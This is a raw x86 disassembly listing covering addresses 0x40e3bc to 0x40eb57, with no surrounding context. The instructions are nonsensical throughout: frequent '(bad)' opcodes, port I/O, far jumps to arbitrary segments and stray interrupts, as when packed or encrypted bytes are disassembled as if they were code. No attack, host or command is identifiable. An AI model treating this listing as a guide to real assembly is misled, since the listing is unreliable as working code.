  40e3bc:	pushf  
  40e3bd:	mov    dl,0x81
  40e3bf:	push   edi
  40e3c0:	or     al,0x2d
  40e3c2:	(bad)  
  40e3c4:	mov    al,0xaf
  40e3c6:	add    ebp,DWORD PTR [ebx]
  40e3c8:	test   BYTE PTR [ebx+0x41c5dc6f],0xf9
  40e3cf:	loop   0x40e425
  40e3d1:	pushw  es
  40e3d3:	aam    0xdf
  40e3d5:	es inc ecx
  40e3d7:	xchg   ebp,eax
  40e3d8:	jne    0x40e43f
  40e3da:	dec    eax
  40e3db:	retf   
  40e3dc:	xchg   esi,eax
  40e3dd:	into   
  40e3de:	fcmove st,st(7)
  40e3e0:	ds in  eax,dx
  40e3e2:	mov    ah,0x4b
  40e3e4:	dec    ebp
  40e3e5:	in     al,0xcc
  40e3e7:	mul    BYTE PTR [esi]
  40e3e9:	push   ecx
  40e3ea:	fimul  DWORD PTR [ecx-0x29a862bf]
  40e3f0:	mov    ch,0xf2
  40e3f2:	stos   BYTE PTR es:[edi],al
  40e3f3:	sub    BYTE PTR [eax+esi*2+0x5cebff02],0x6d
  40e3fb:	inc    ebx
  40e3fc:	sbb    dh,BYTE PTR [ebx+edi*4]
  40e3ff:	test   esp,0xa9bd2c0a
  40e405:	int3   
  40e406:	mov    dl,0x76
  40e408:	test   al,0x1f
  40e40a:	xor    BYTE PTR [ecx+0xe5c04cc],ah
  40e410:	pop    ds
  40e411:	jmp    0x1bffce95
  40e416:	mov    cl,BYTE PTR [edi+0x596b37f7]
  40e41c:	lods   al,BYTE PTR ds:[esi]
  40e41d:	loopne 0x40e39f
  40e41f:	jmp    0x40e459
  40e421:	mov    ds:0x870bb8f6,eax
  40e426:	cmp    al,0x30
  40e428:	sub    esi,DWORD PTR ds:[ebx]
  40e42b:	mov    edx,0x8065abad
  40e430:	test   BYTE PTR [edi],0xb7
  40e433:	lods   al,BYTE PTR ds:[esi]
  40e434:	inc    esi
  40e435:	push   eax
  40e436:	bound  ecx,QWORD PTR [ecx+eax*4+0x3b]
  40e43a:	sbb    DWORD PTR [edi+0x78],0x2c710f48
  40e441:	and    bl,0xac
  40e444:	iret   
  40e445:	push   edi
  40e446:	mov    ebx,0x7cf36961
  40e44b:	mov    ebp,0x5b89b742
  40e450:	mov    DWORD PTR [ebx+0x59a1c35e],0xf7a28dd2
  40e45a:	and    BYTE PTR [ebx],dl
  40e45c:	shr    BYTE PTR [ecx-0x34e9d721],1
  40e462:	outs   dx,BYTE PTR ds:[esi]
  40e463:	xor    esp,DWORD PTR [eax-0x69e7471b]
  40e469:	rcl    DWORD PTR [edx],0xe5
  40e46c:	cdq    
  40e46d:	sub    eax,0xabab84e4
  40e472:	mul    BYTE PTR [edi+0x14]
  40e475:	and    BYTE PTR [edx-0x3794a3ab],0xcb
  40e47c:	and    BYTE PTR [ebp-0xaadaa2a],bl
  40e482:	fistp  WORD PTR [ecx-0x67]
  40e485:	xor    bl,BYTE PTR [ebx+0x56]
  40e488:	inc    ebx
  40e489:	jb     0x40e4fd
  40e48b:	xor    BYTE PTR [ecx],dl
  40e48d:	and    ebp,DWORD PTR [edi]
  40e48f:	pop    edi
  40e490:	aad    0x26
  40e492:	stos   WORD PTR es:[edi],ax
  40e494:	or     al,0x6b
  40e496:	xor    BYTE PTR [edi+0x335b77da],0xe7
  40e49d:	in     al,dx
  40e49e:	fwait
  40e49f:	push   ebp
  40e4a0:	cvtps2pi mm5,QWORD PTR [edx]
  40e4a3:	lods   eax,DWORD PTR ds:[esi]
  40e4a4:	outs   dx,DWORD PTR ds:[esi]
  40e4a5:	bound  ecx,QWORD PTR [eax-0x7a9320f1]
  40e4ab:	daa    
  40e4ac:	idiv   DWORD PTR [ebp-0x3a2184b4]
  40e4b2:	stos   DWORD PTR es:[edi],eax
  40e4b3:	rep outs dx,DWORD PTR ds:[esi]
  40e4b5:	aaa    
  40e4b6:	adc    edi,DWORD PTR [ebp+0x4dc9dc26]
  40e4bc:	adc    BYTE PTR [eax-0x264aa770],bh
  40e4c2:	mov    dl,0xc5
  40e4c4:	mov    dh,0x6b
  40e4c6:	ret    
  40e4c7:	fmul   QWORD PTR [eax]
  40e4c9:	fwait
  40e4ca:	or     dh,BYTE PTR [ebp-0x7c4d0070]
  40e4d0:	(bad)  
  40e4d2:	enter  0x1aff,0x62
  40e4d6:	add    ebp,DWORD PTR [ebx]
  40e4d8:	push   ebx
  40e4d9:	jno    0x40e499
  40e4db:	in     eax,dx
  40e4dc:	cdq    
  40e4dd:	lock loopne 0x40e4cf
  40e4e0:	arpl   ax,cx
  40e4e2:	pop    esp
  40e4e3:	dec    ecx
  40e4e4:	mov    ecx,0x92c150c7
  40e4e9:	xor    eax,0xb6c36071
  40e4ee:	ficom  WORD PTR [edi]
  40e4f0:	frstor [ebx]
  40e4f2:	mov    DWORD PTR [ebx-0x3cff9a4f],eax
  40e4f8:	scas   al,BYTE PTR es:[edi]
  40e4f9:	jno    0x40e4ed
  40e4fb:	fdivr  DWORD PTR [edx-0x700bb873]
  40e501:	jns    0x40e4ac
  40e503:	push   ds
  40e504:	enter  0x5a0,0x37
  40e508:	sbb    DWORD PTR [esi+0x76],0x5b832c57
  40e50f:	sbb    DWORD PTR [ecx+0x2ca500ae],edx
  40e515:	sbb    dl,BYTE PTR [ebp-0x9977b49]
  40e51b:	mov    edx,0x5840a708
  40e520:	setg   dh
  40e523:	mov    edx,0xc8f951b2
  40e528:	fwait
  40e529:	adc    DWORD PTR [edi-0x24394e4e],ebx
  40e52f:	cld    
  40e530:	cmp    al,BYTE PTR [ecx]
  40e532:	jl     0x40e50b
  40e534:	mov    ds:0xf6a0c73a,al
  40e539:	ds jmp 0x799775db
  40e53f:	push   ebp
  40e540:	loop   0x40e50d
  40e542:	je     0x40e4fe
  40e544:	(bad)  
  40e545:	xchg   edi,eax
  40e546:	dec    ebx
  40e547:	ins    BYTE PTR es:[edi],dx
  40e548:	(bad)  
  40e549:	adc    DWORD PTR [esi],ebp
  40e54b:	neg    DWORD PTR [edi]
  40e54d:	ins    BYTE PTR es:[edi],dx
  40e54e:	dec    ecx
  40e54f:	push   0xde671a01
  40e554:	mov    ecx,0xc551482f
  40e559:	out    0xdc,al
  40e55b:	push   cs
  40e55c:	iret   
  40e55d:	cmc    
  40e55e:	mov    ah,0xa1
  40e560:	push   esi
  40e561:	push   es
  40e562:	loopne 0x40e5ab
  40e564:	or     ch,BYTE PTR [esi-0x5f]
  40e567:	push   ecx
  40e568:	inc    esi
  40e569:	icebp  
  40e56a:	popfw  
  40e56c:	sbb    DWORD PTR [ebx],ebx
  40e56e:	stos   DWORD PTR es:[edi],eax
  40e56f:	or     DWORD PTR [esi],0x39676908
  40e575:	aaa    
  40e576:	or     dl,BYTE PTR [edx+0x21]
  40e579:	push   ebp
  40e57a:	pop    ecx
  40e57b:	sbb    eax,0x6ca422a4
  40e580:	add    edi,ebx
  40e582:	aas    
  40e583:	jl     0x40e559
  40e585:	(bad)  
  40e586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e587:	cli    
  40e588:	mov    esp,0xc5d468e4
  40e58d:	in     eax,0xc9
  40e58f:	dec    edx
  40e590:	inc    esi
  40e591:	ja     0x40e5d9
  40e593:	xchg   edi,eax
  40e594:	fmul   QWORD PTR [ecx+ebp*1]
  40e597:	push   0xffffffbf
  40e599:	fnstenv [esi-0x45be7074]
  40e59f:	adc    ebx,DWORD PTR [ebx-0x68]
  40e5a2:	int3   
  40e5a3:	in     eax,dx
  40e5a4:	push   edx
  40e5a5:	mov    esi,DWORD PTR [eax+0x1b]
  40e5a8:	jo     0x40e555
  40e5aa:	mov    ds:0xebc6dc19,al
  40e5af:	xchg   edx,eax
  40e5b0:	and    esp,eax
  40e5b2:	fsubr  QWORD PTR [esi+0x6409d98]
  40e5b8:	stos   BYTE PTR es:[edi],al
  40e5b9:	inc    ecx
  40e5ba:	push   edx
  40e5bb:	aad    0x7f
  40e5bd:	and    eax,0x6e3aceda
  40e5c2:	frstor [esi+0x1bb2f296]
  40e5c8:	jae    0x40e5e5
  40e5ca:	xchg   ebp,eax
  40e5cb:	test   al,0x7c
  40e5cd:	jl     0x40e56c
  40e5cf:	xchg   ebx,eax
  40e5d0:	sub    eax,0x56029bb0
  40e5d5:	mov    eax,0xc26185b2
  40e5da:	jae    0x40e659
  40e5dc:	inc    ebp
  40e5dd:	push   edi
  40e5de:	outs   dx,BYTE PTR ds:[esi]
  40e5df:	inc    DWORD PTR ds:0x13e67d1c
  40e5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5e6:	ret    
  40e5e7:	push   es
  40e5e8:	in     eax,dx
  40e5e9:	cmp    BYTE PTR ds:0xa4d10e7a,bh
  40e5ef:	mov    ebx,0xf2831f60
  40e5f4:	ss cwde 
  40e5f6:	xchg   edi,eax
  40e5f7:	ja     0x40e662
  40e5f9:	mov    al,BYTE PTR [esi-0x5642c94e]
  40e5ff:	jge    0x40e642
  40e601:	and    cl,BYTE PTR [ebx-0x1e]
  40e604:	mov    ebx,0xc693ea86
  40e609:	sti    
  40e60a:	sub    al,bl
  40e60c:	stos   DWORD PTR es:[edi],eax
  40e60d:	retf   
  40e60e:	ss cdq 
  40e610:	or     DWORD PTR [ebx],ebx
  40e612:	or     al,0x3a
  40e614:	inc    ebp
  40e615:	mov    edx,0xb932fd87
  40e61a:	push   0x9a157a9d
  40e61f:	and    edx,esi
  40e621:	sub    BYTE PTR [ecx+eiz*4+0x60],cl
  40e625:	adc    DWORD PTR [ecx-0x143b6298],esi
  40e62b:	data16 sbb cl,BYTE PTR [ebp-0x66]
  40e62f:	push   esp
  40e630:	repz mov ah,0x91
  40e633:	inc    eax
  40e634:	xor    eax,0xf4c44a60
  40e639:	scas   al,BYTE PTR es:[edi]
  40e63a:	dec    ebp
  40e63b:	sbb    dh,BYTE PTR [ebp+0x9]
  40e63e:	nop
  40e63f:	sbb    eax,0x6cb72087
  40e644:	int    0xe8
  40e646:	lds    ebp,FWORD PTR [edx+0x4e]
  40e649:	ror    DWORD PTR [edx-0x36],cl
  40e64c:	or     edi,DWORD PTR [edx]
  40e64e:	mov    ebp,0xa9dd45f2
  40e653:	es ins BYTE PTR es:[edi],dx
  40e655:	out    dx,al
  40e656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e657:	xchg   edx,eax
  40e658:	and    bh,BYTE PTR [ecx+edi*4+0x2e]
  40e65c:	mov    ch,0xdb
  40e65e:	sub    eax,DWORD PTR [edx+0x5a56e626]
  40e664:	test   eax,0x9d25331d
  40e669:	rcl    DWORD PTR [bx+di-0x6],1
  40e66d:	push   es
  40e66e:	adc    BYTE PTR ds:0x110f9770,dh
  40e674:	dec    esp
  40e675:	fcmovnu st,st(1)
  40e677:	call   0xacd8:0xa577afa0
  40e67e:	xchg   ebx,eax
  40e67f:	bound  esp,QWORD PTR [eax-0x8]
  40e682:	es icebp 
  40e684:	fiadd  WORD PTR fs:[eax+0x50]
  40e688:	sbb    esi,DWORD PTR [ecx-0x45]
  40e68b:	jmp    0x40e66d
  40e68d:	jb     0x40e665
  40e68f:	xor    BYTE PTR [ebx],ah
  40e691:	xor    eax,0x34eaa1fe
  40e696:	push   edi
  40e697:	pop    esi
  40e698:	inc    edx
  40e699:	xchg   edi,eax
  40e69a:	mov    ebp,?
  40e69c:	test   BYTE PTR [ebx-0x41],bh
  40e69f:	xor    bh,BYTE PTR [ebx-0x56f23662]
  40e6a5:	jmp    0xa37d8497
  40e6aa:	inc    ecx
  40e6ac:	lods   al,BYTE PTR ds:[esi]
  40e6ad:	push   edx
  40e6ae:	mov    ecx,0x73ab58d0
  40e6b3:	repz jne 0x40e681
  40e6b6:	mov    eax,0x9b7c1b6e
  40e6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6bc:	add    al,0x19
  40e6be:	sbb    bl,BYTE PTR [ebx]
  40e6c0:	test   al,0xdd
  40e6c2:	push   es
  40e6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c4:	lahf   
  40e6c5:	iret   
  40e6c6:	push   0xffffff92
  40e6c8:	push   0x7a
  40e6ca:	sub    al,0xc
  40e6cc:	out    dx,eax
  40e6cd:	(bad)  
  40e6ce:	nop    DWORD PTR [ebx-0x2e344672]
  40e6d5:	push   ss
  40e6d6:	iret   
  40e6d7:	push   ds
  40e6d8:	popf   
  40e6d9:	mov    esi,0x73a1e0f3
  40e6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6df:	mov    edx,0x5a60d4da
  40e6e4:	inc    edx
  40e6e5:	pop    ebp
  40e6e6:	movd   DWORD PTR [ecx],mm1
  40e6e9:	mov    ecx,0x69cb9421
  40e6ee:	imul   ebp,DWORD PTR [eax],0xa020d78
  40e6f4:	popa   
  40e6f5:	xchg   ecx,eax
  40e6f6:	push   es
  40e6f7:	iret   
  40e6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6f9:	lock into 
  40e6fb:	mov    bh,0x3a
  40e6fd:	adc    DWORD PTR [ebx],esi
  40e6ff:	push   ebx
  40e700:	repz cld 
  40e702:	mov    ecx,0xe718823d
  40e707:	out    dx,al
  40e708:	loope  0x40e6f6
  40e70a:	bound  ecx,QWORD PTR [ecx+eax*2-0x61]
  40e70e:	loop   0x40e6cc
  40e710:	mov    ah,BYTE PTR fs:[eax+esi*2+0x615e6afa]
  40e718:	sti    
  40e719:	and    eax,0xaa6ce074
  40e71e:	mov    ecx,0x1a75c045
  40e723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e724:	inc    ebp
  40e725:	jmp    0x86ee:0x45eff5aa
  40e72c:	push   0x34548a43
  40e731:	inc    esp
  40e732:	jmp    0x670420e
  40e737:	mov    ebp,0x4ef300f1
  40e73c:	xlat   BYTE PTR ds:[ebx]
  40e73d:	mov    ecx,0x2edff6a8
  40e742:	hlt    
  40e743:	hlt    
  40e744:	mov    edx,eax
  40e746:	addr16 fldln2 
  40e749:	push   ss
  40e74a:	test   BYTE PTR [eax+0x2520a53e],bh
  40e750:	cld    
  40e751:	mov    ds:0x9a39c11b,eax
  40e756:	nop
  40e757:	pop    ebx
  40e758:	rol    DWORD PTR [eax-0x23],1
  40e75b:	cmc    
  40e75c:	std    
  40e75d:	push   edx
  40e75e:	shr    BYTE PTR [ebx-0x19],cl
  40e761:	cmp    ebx,DWORD PTR [esi-0x25abed88]
  40e767:	push   ebx
  40e768:	fstp   TBYTE PTR [eax-0x1ba5ebcf]
  40e76e:	lods   eax,DWORD PTR ds:[esi]
  40e76f:	loopne 0x40e7e2
  40e771:	stos   DWORD PTR es:[edi],eax
  40e772:	mov    es,WORD PTR [eax-0x3a]
  40e775:	retfw  0x6657
  40e779:	and    eax,0x4ae38917
  40e77e:	ss inc ecx
  40e780:	sub    ah,BYTE PTR [esi-0x7a]
  40e783:	xchg   edi,eax
  40e784:	out    0x43,eax
  40e786:	pop    es
  40e787:	fdivrp st(7),st
  40e789:	shl    DWORD PTR [ebx-0x75c3db9d],1
  40e78f:	mov    dl,0xb4
  40e791:	sti    
  40e792:	dec    eax
  40e793:	sbb    dh,BYTE PTR [eax+0x433466ff]
  40e799:	imul   ebp,DWORD PTR [eax-0x3e],0x60a8e02b
  40e7a0:	mov    al,ds:0xb330df42
  40e7a5:	mov    eax,0x1f935a55
  40e7aa:	sub    eax,0x9b1c1ec8
  40e7af:	or     eax,0xc312a895
  40e7b4:	inc    esi
  40e7b5:	fcom   DWORD PTR ds:0x1cf41e4a
  40e7bb:	adc    eax,0xac9221b5
  40e7c0:	jo     0x40e821
  40e7c2:	(bad)  
  40e7c3:	sti    
  40e7c4:	pop    esi
  40e7c5:	mov    esp,0xd3077e9d
  40e7ca:	cld    
  40e7cb:	add    DWORD PTR [esi+ebp*1],edi
  40e7ce:	xor    DWORD PTR [edx+0x69fd16e3],edx
  40e7d4:	out    dx,al
  40e7d5:	jmp    0x40e79f
  40e7d7:	fsubr  st(4),st
  40e7d9:	jl     0x40e7d6
  40e7db:	jne    0x40e762
  40e7dd:	and    al,0xbc
  40e7df:	mov    BYTE PTR [edi],cl
  40e7e1:	xor    esi,eax
  40e7e3:	adc    ch,BYTE PTR [edx+0x30]
  40e7e6:	std    
  40e7e7:	or     ebx,DWORD PTR [eax]
  40e7e9:	scas   eax,DWORD PTR es:[edi]
  40e7ea:	and    bh,BYTE PTR [esi+0x4a38a798]
  40e7f0:	icebp  
  40e7f1:	mov    al,ds:0xaf8435b8
  40e7f6:	dec    esi
  40e7f7:	lea    ecx,[ebx]
  40e7f9:	or     BYTE PTR [ebp+0x5a],dh
  40e7fc:	mov    al,0xd1
  40e7fe:	cld    
  40e7ff:	scas   eax,DWORD PTR es:[edi]
  40e800:	adc    al,BYTE PTR [edx-0x67a341e1]
  40e806:	add    eax,0x60518307
  40e80b:	loopne 0x40e7a7
  40e80d:	xchg   ebp,eax
  40e80e:	daa    
  40e80f:	xchg   ah,bl
  40e811:	call   0xa38c:0xa58617ec
  40e818:	(bad)  
  40e819:	lock xchg edx,eax
  40e81b:	fsincos 
  40e81d:	or     al,0xf5
  40e81f:	xor    eax,0x2cc4cae8
  40e825:	pushf  
  40e826:	adc    dl,cl
  40e828:	je     0x40e80e
  40e82a:	stc    
  40e82b:	or     eax,0xaf1feb0
  40e830:	or     al,0x22
  40e832:	ins    BYTE PTR es:[edi],dx
  40e833:	mov    bl,0x3a
  40e835:	bound  esi,QWORD PTR ds:0xb428d130
  40e83b:	xor    BYTE PTR [edx-0x28],0x6c
  40e83f:	xor    eax,0xda66039e
  40e844:	pop    ebp
  40e845:	pop    es
  40e846:	daa    
  40e847:	or     esp,edx
  40e849:	sbb    DWORD PTR [ecx],ebp
  40e84b:	mov    ch,0xde
  40e84d:	in     eax,dx
  40e84e:	and    DWORD PTR [esi*2-0x62852ce9],esp
  40e855:	cmp    esp,DWORD PTR [eax+0x18]
  40e858:	ret    
  40e859:	mov    bl,0x9
  40e85b:	and    edi,edi
  40e85d:	pop    esp
  40e85e:	pop    ebp
  40e85f:	out    dx,eax
  40e860:	cmc    
  40e861:	repz mov ds:0x8dcf1a63,eax
  40e867:	es cs int3 
  40e86a:	enter  0x99bb,0xe6
  40e86e:	mov    cl,0x81
  40e870:	or     al,0x98
  40e872:	fild   DWORD PTR [edi]
  40e874:	(bad)  
  40e876:	xchg   ebp,eax
  40e877:	shr    BYTE PTR [ecx+0x39],cl
  40e87a:	or     DWORD PTR [ebx+0x72],edx
  40e87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e87e:	lea    ebx,[edi-0x2a1df89e]
  40e884:	ja     0x40e850
  40e886:	int3   
  40e887:	push   ebx
  40e888:	aad    0xe4
  40e88a:	js     0x40e8f0
  40e88c:	fbld   TBYTE PTR [esi+0x28]
  40e88f:	add    cl,BYTE PTR ds:0x31617b26
  40e895:	pop    ss
  40e896:	cmp    al,cl
  40e898:	popa   
  40e899:	daa    
  40e89a:	std    
  40e89b:	mov    dh,0x5d
  40e89d:	mov    esi,0x954d63f6
  40e8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8a3:	mov    edi,0x4b3e0ba2
  40e8a8:	pop    ebp
  40e8a9:	jmp    0x712f6d85
  40e8ae:	arpl   WORD PTR [edi+ebx*8],si
  40e8b1:	into   
  40e8b2:	mov    al,0x6d
  40e8b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8b5:	pop    es
  40e8b6:	mov    eax,0x644edf05
  40e8bb:	shl    BYTE PTR [esi-0x44dba338],cl
  40e8c1:	push   edi
  40e8c2:	xor    esi,DWORD PTR [ecx]
  40e8c4:	mov    bl,0x83
  40e8c6:	mul    DWORD PTR [edx]
  40e8c8:	out    dx,al
  40e8c9:	fist   WORD PTR [ecx-0xc]
  40e8cc:	jp     0x40e919
  40e8ce:	cli    
  40e8cf:	jecxz  0x40e890
  40e8d1:	sbb    dh,ch
  40e8d3:	fwait
  40e8d4:	outs   dx,DWORD PTR ds:[esi]
  40e8d5:	mov    eax,ds:0x9c1b006d
  40e8da:	ss dec ebx
  40e8dc:	imul   ebp,DWORD PTR [edi-0x1a318d83],0x6b6dffb7
  40e8e6:	es xor ah,ch
  40e8e9:	push   eax
  40e8ea:	xchg   esp,eax
  40e8eb:	cmp    eax,0x3feea494
  40e8f0:	imul   DWORD PTR gs:[ecx+0x4c8d3c]
  40e8f7:	xchg   ebx,eax
  40e8f8:	addr16 inc eax
  40e8fa:	test   BYTE PTR [eax-0x41cc88c4],dl
  40e900:	adc    DWORD PTR [ecx-0x1c],0x704b193c
  40e907:	fucomip st,st(1)
  40e909:	les    ecx,FWORD PTR [edx+0x279aa879]
  40e90f:	push   edx
  40e910:	adc    bl,BYTE PTR [eax]
  40e912:	push   ds
  40e913:	sub    al,0x3e
  40e915:	scas   eax,DWORD PTR es:[edi]
  40e916:	dec    ecx
  40e917:	pop    ebx
  40e918:	sub    BYTE PTR [eax+ecx*2],0x30
  40e91c:	test   eax,0x2e36b94d
  40e921:	mov    ebx,edx
  40e923:	fwait
  40e924:	cmp    ebx,DWORD PTR [esi+0x5693fbc7]
  40e92a:	test   dl,ah
  40e92c:	call   0x1da1:0x7e193bc8
  40e933:	dec    esp
  40e934:	add    eax,0x150f3d91
  40e939:	bound  edx,QWORD PTR [edi+0x33]
  40e93c:	dec    edi
  40e93d:	js     0x40e8d0
  40e93f:	jmp    0xbbd9d6bd
  40e944:	and    BYTE PTR [esi+0x12],dh
  40e947:	setno  BYTE PTR [ebx-0x476b126a]
  40e94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e94f:	jmp    0x40e8e4
  40e951:	pop    ds
  40e952:	pop    esi
  40e953:	into   
  40e954:	loop   0x40e968
  40e956:	aaa    
  40e957:	jnp    0x40e94e
  40e959:	xor    edx,eax
  40e95b:	sub    eax,0x11df67a
  40e960:	mov    ebp,0x34f9c340
  40e965:	retf   
  40e966:	(bad)  
  40e969:	loopne 0x40e9a0
  40e96b:	fadd   st,st(3)
  40e96d:	xor    esi,0xe6be0225
  40e973:	pop    ebp
  40e974:	mov    ebx,0x86ed62c0
  40e979:	ss stc 
  40e97b:	(bad)  
  40e97d:	or     eax,0x33e95c9e
  40e982:	test   BYTE PTR [esi+0x5a],ch
  40e985:	bound  edx,QWORD PTR [ecx]
  40e987:	mov    ch,0x17
  40e989:	xchg   ebp,eax
  40e98a:	sbb    DWORD PTR ds:0xc29a70f1,edi
  40e990:	mov    ebp,0x69d5f174
  40e995:	imul   ebp,DWORD PTR [ebp-0xf],0x8bde603a
  40e99c:	xchg   ecx,eax
  40e99d:	ins    DWORD PTR es:[edi],dx
  40e99e:	inc    esp
  40e99f:	ds sbb eax,0x26d8a7a
  40e9a5:	dec    esi
  40e9a6:	cmp    edx,DWORD PTR [esi-0x23]
  40e9a9:	test   DWORD PTR [ecx],esp
  40e9ab:	sti    
  40e9ac:	dec    ecx
  40e9ad:	jmp    0x40e9b7
  40e9af:	lds    ecx,FWORD PTR [ecx-0x3c]
  40e9b2:	xchg   esp,eax
  40e9b3:	iret   
  40e9b4:	adc    DWORD PTR [ebp-0x30],edx
  40e9b7:	stos   DWORD PTR es:[edi],eax
  40e9b8:	and    DWORD PTR [eax+0x67185165],esi
  40e9be:	imul   ecx,DWORD PTR ds:[edi-0x7],0x78
  40e9c3:	ret    0x15f4
  40e9c6:	hlt    
  40e9c7:	lds    esi,FWORD PTR [edx+esi*1]
  40e9ca:	add    bh,dh
  40e9cc:	es xchg ebp,eax
  40e9ce:	mov    eax,ebp
  40e9d0:	adc    eax,0xc85c835e
  40e9d5:	sub    eax,edx
  40e9d7:	loope  0x40e9e3
  40e9d9:	retf   0x87d8
  40e9dc:	cld    
  40e9dd:	pop    esi
  40e9de:	aam    0x99
  40e9e0:	js     0x40ea50
  40e9e2:	cmp    BYTE PTR [edi+0x2d],bl
  40e9e5:	add    ecx,edx
  40e9e7:	adc    DWORD PTR [ecx+ebp*8],ebx
  40e9ea:	xchg   edi,eax
  40e9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ec:	push   esp
  40e9ed:	mov    ds:0x2643aa0e,al
  40e9f2:	(bad)  
  40e9f3:	lock mov eax,ds:0x994613ef
  40e9f9:	dec    edi
  40e9fa:	sub    esi,esp
  40e9fc:	cdq    
  40e9fd:	lds    esi,FWORD PTR [esi]
  40e9ff:	mov    cl,0xcd
  40ea01:	xor    eax,0x3f1cfb27
  40ea06:	add    bl,ch
  40ea08:	popf   
  40ea09:	push   ecx
  40ea0a:	fs pop es
  40ea0c:	add    al,0x15
  40ea0e:	aas    
  40ea0f:	sub    DWORD PTR [ebx+0xa],edi
  40ea12:	xor    esp,DWORD PTR [eax-0x29]
  40ea15:	pop    edi
  40ea16:	sbb    eax,0x9b066cb6
  40ea1b:	and    eax,0xaa75dc6c
  40ea20:	shl    DWORD PTR [ecx+0x6e],cl
  40ea23:	retf   0xb1a
  40ea26:	inc    edi
  40ea27:	and    ch,BYTE PTR [edi+0x53]
  40ea2a:	add    ebx,esp
  40ea2c:	add    esi,DWORD PTR [ebx]
  40ea2e:	adc    dl,dl
  40ea30:	das    
  40ea31:	fwait
  40ea32:	das    
  40ea33:	and    eax,0xaae8c8c6
  40ea38:	in     al,dx
  40ea39:	les    edx,FWORD PTR [ecx+0x7c]
  40ea3c:	nop
  40ea3d:	out    0xf7,eax
  40ea3f:	fdivr  DWORD PTR [eax+0x2d4d9b9c]
  40ea45:	imul   bl
  40ea47:	(bad)  
  40ea48:	aam    0x76
  40ea4a:	adc    al,BYTE PTR ds:0xaa71ed7a
  40ea50:	sbb    al,0x47
  40ea52:	out    dx,al
  40ea53:	sar    DWORD PTR [edi-0x2c31e01c],1
  40ea59:	pop    esp
  40ea5a:	fdiv   DWORD PTR [eax+0x63388c6b]
  40ea60:	push   esp
  40ea61:	test   al,0x82
  40ea63:	aam    0xe7
  40ea65:	jne    0x40ea8d
  40ea67:	std    
  40ea68:	lods   al,BYTE PTR ds:[esi]
  40ea69:	dec    esp
  40ea6a:	dec    DWORD PTR [esi+0xebc73e1]
  40ea70:	cs retf 0xf218
  40ea74:	(bad)  
  40ea75:	int3   
  40ea76:	rcl    dh,0x4
  40ea79:	jb     0x40e9fe
  40ea7b:	xor    eax,0xca7acaeb
  40ea80:	loop   0x40ea0c
  40ea82:	mov    esp,0xe9bd1083
  40ea87:	adc    eax,0xd2e01792
  40ea8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8d:	dec    eax
  40ea8e:	dec    ebp
  40ea8f:	test   al,0x39
  40ea91:	xor    eax,0xab80c21c
  40ea96:	xor    ch,ch
  40ea98:	and    dl,dl
  40ea9a:	out    0x5f,al
  40ea9c:	jo     0x40ea8e
  40ea9e:	or     bl,BYTE PTR [edi+0x1b]
  40eaa1:	xor    eax,0x2bf692b3
  40eaa6:	pop    esi
  40eaa7:	push   DWORD PTR [ecx]
  40eaa9:	sahf   
  40eaaa:	push   eax
  40eaab:	(bad)  
  40eaac:	jg     0x40ea94
  40eaae:	xrelease mov DWORD PTR fs:[edx],esi
  40eab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab3:	sbb    BYTE PTR [ebp-0x6a],ah
  40eab6:	shl    BYTE PTR [ecx+0x6bafb8f0],cl
  40eabc:	inc    edi
  40eabd:	inc    ecx
  40eabe:	sub    DWORD PTR [eax+eax*8],0x51c39e10
  40eac5:	out    0xe9,eax
  40eac7:	mov    ds:0xd31b8735,eax
  40eacc:	inc    esi
  40eacd:	ret    0x3244
  40ead0:	ss out dx,al
  40ead2:	jp     0x40ea72
  40ead4:	or     DWORD PTR [esi],0x3074bdab
  40eada:	dec    edx
  40eadb:	cmp    DWORD PTR [ebx+0x407d54a0],0x47
  40eae2:	dec    esi
  40eae3:	(bad)  [eax+0x22]
  40eae6:	push   esi
  40eae7:	icebp  
  40eae8:	(bad)  
  40eae9:	nop
  40eaea:	adc    al,0xac
  40eaec:	inc    esp
  40eaed:	arpl   WORD PTR ds:0xcd7f504d,si
  40eaf3:	sub    bl,bh
  40eaf5:	adc    eax,0xa281bdab
  40eafa:	aam    0x5c
  40eafc:	sub    bl,ch
  40eafe:	in     eax,0x2c
  40eb00:	inc    ebp
  40eb01:	mov    edx,0x56c1ab40
  40eb06:	mov    eax,ds:0xd3402649
  40eb0b:	push   eax
  40eb0c:	pextrw edi,(bad),0xc5
  40eb0e:	cmp    eax,0x74c6c157
  40eb13:	or     DWORD PTR [eax+0x5d],ebp
  40eb16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb17:	je     0x40eac8
  40eb19:	push   eax
  40eb1a:	leave  
  40eb1b:	mov    ds:0xca2b66b6,eax
  40eb20:	repnz ins BYTE PTR es:[edi],dx
  40eb22:	mov    ch,0x38
  40eb24:	lods   eax,DWORD PTR ds:[esi]
  40eb25:	popa   
  40eb26:	adc    eax,0x344a0684
  40eb2b:	outs   dx,BYTE PTR ds:[esi]
  40eb2c:	xor    DWORD PTR [ebx+0x78],ecx
  40eb2f:	and    BYTE PTR [ebp-0x1a],dh
  40eb32:	adc    DWORD PTR [ebx],edx
  40eb34:	(bad)  
  40eb35:	mov    ds:0x8df027b,al
  40eb3a:	pop    esi
  40eb3b:	adc    esi,DWORD PTR ds:0xe781b8a1
  40eb41:	cmp    edi,DWORD PTR [edi+eiz*8+0x76]
  40eb45:	call   0xe2f4:0x3ee1260a
  40eb4c:	mov    BYTE PTR [edi],ch
  40eb4e:	es sub al,0xa2
  40eb51:	sbb    eax,0x439979c6
  40eb56:	inc    edx
  40eb57:	pop    ss
